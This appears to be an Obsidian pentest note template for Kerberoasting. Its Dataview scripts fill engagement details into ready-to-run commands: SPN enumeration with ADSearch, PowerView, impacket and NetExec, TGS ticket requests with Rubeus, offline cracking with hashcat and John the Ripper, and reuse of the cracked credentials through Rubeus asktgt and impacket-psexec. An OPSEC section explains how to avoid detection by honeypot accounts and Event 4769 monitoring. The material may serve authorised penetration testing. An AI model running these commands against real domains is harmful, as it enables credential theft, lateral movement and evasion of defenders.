---
# Attack-specific fields
target_user:
target_spn:
roasted_hash:
cracked_password:
wordlist: /usr/share/wordlists/rockyou.txt
hash_file: hashes_kerberoast.txt
notes:
---

# Kerberoasting

> [!abstract] Attack Summary
> Request TGS tickets for accounts with SPNs, then crack them offline to recover plaintext passwords. The KDC issues tickets encrypted with the service account's password hash — no special privileges required.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();

dv.table(["Field", "Value"], [
  ["Target User (leave blank for all)",  `\`INPUT[text:target_user]\``],
  ["Hash Output File",                   `\`INPUT[text(defaultValue("${p.hash_file ?? 'hashes_kerberoast.txt'}")):hash_file]\``],
  ["Wordlist Path",                      `\`INPUT[text(defaultValue("${p.wordlist ?? '/usr/share/wordlists/rockyou.txt'}")):wordlist]\``],
]);
```

---

## Step 1 — Enumerate SPN Accounts

> [!info] Before roasting everything, enumerate first. Avoid honey-pot accounts (unusual or fake SPNs).

**Windows — ADSearch**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(&(objectCategory=user)(servicePrincipalName=*))\" " +
  "--attributes cn,servicePrincipalName,samAccountName\n```");
```

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.paragraph("```powershell\nGet-DomainUser -SPN -Properties samaccountname,serviceprincipalname | fl\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-GetUserSPNs " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + " -request\n```");
```

**Linux — NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' --kerberoasting KERBEROAST.txt\n```");
```

---

## Step 2 — Request TGS Tickets

Enter the target user (or leave blank for all):
`INPUT[text:target_user]`

**Windows — Rubeus (all accounts)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const file = p?.hash_file ?? "hashes_kerberoast.txt";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe kerberoast /simple /nowrap /outfile:" + file + "\n```");
```

**Windows — Rubeus (specific user)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const targetUser = p?.target_user || "TARGET_USER";
const file       = p?.hash_file ?? "hashes_kerberoast.txt";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe kerberoast /user:" + targetUser + " /nowrap /outfile:" + file + "\n```");
```

Paste captured hash: `INPUT[text:roasted_hash]`

---

## Step 3 — Crack Hashes Offline

**Hashcat**
```dataviewjs
const p = dv.current();
const file     = p?.hash_file ?? "hashes_kerberoast.txt";
const wordlist = p?.wordlist  ?? "/usr/share/wordlists/rockyou.txt";
dv.paragraph("```bash\nhashcat -a 0 -m 13100 " + file + " " + wordlist + "\n\n# Rule-based\nhashcat -a 0 -m 13100 " + file + " " + wordlist + " -r /usr/share/hashcat/rules/best64.rule\n\n# AES-128 tickets (etype 17)\nhashcat -a 0 -m 19600 " + file + " " + wordlist + "\n\n# AES-256 tickets (etype 18)\nhashcat -a 0 -m 19700 " + file + " " + wordlist + "\n```");
```

**John the Ripper**
```dataviewjs
const p = dv.current();
const file     = p?.hash_file ?? "hashes_kerberoast.txt";
const wordlist = p?.wordlist  ?? "/usr/share/wordlists/rockyou.txt";
dv.paragraph("```bash\njohn --format=krb5tgs --wordlist=" + wordlist + " " + file + "\n\njohn --show " + file + "\n```");
```

> [!tip] If john fails, try removing the SPN from the hash header so it reads: `$krb5tgs$23$*username$domain*$HASH`

Cracked password: `INPUT[text:cracked_password]`

---

## Step 4 — Leverage Access

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const targetUser = p?.target_user ?? "TARGET_USER";
const cracked    = p?.cracked_password ?? "CRACKED_PASSWORD";

dv.paragraph("```bash\n# Test credentials — Windows\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:" +
  targetUser + " /password:" + cracked + " /domain:" + domain + " /nowrap\n\n" +
  "# Test credentials — Linux\nimpacket-getTGT " + domain + "/" + targetUser + ":'" + cracked + "'\nimpacket-psexec " + domain + "/" + targetUser + ":'" + cracked + "'@" + dc_ip + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - **Event 4769** — Kerberos service ticket request. High volume = suspicious.
> - Honey-pot accounts trigger 4769 for SPNs that are never legitimately used.
> - RC4 (etype 23) tickets are more suspicious than AES tickets in modern environments.
> - Prefer targeting specific accounts after enumeration rather than mass-roasting.

---

## Notes & Results

`INPUT[textarea:notes]`
